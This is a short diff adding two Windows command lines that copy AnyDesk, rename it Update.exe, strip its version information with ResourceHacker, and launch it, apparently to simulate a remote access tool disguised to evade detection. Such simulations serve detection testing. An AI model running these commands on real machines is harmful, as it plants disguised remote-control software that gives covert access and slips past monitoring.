@@ -1,0 +1,2 @@
+copy AnyDesk.exe Update.exe && ResourceHacker.exe -open Update.exe -save Update.exe -action delete -mask versioninfo,, && Update.exe
+mkdir C:\Temp\AppData\ && copy AnyDesk.exe AnyDesk.exe && AnyDesk.exe
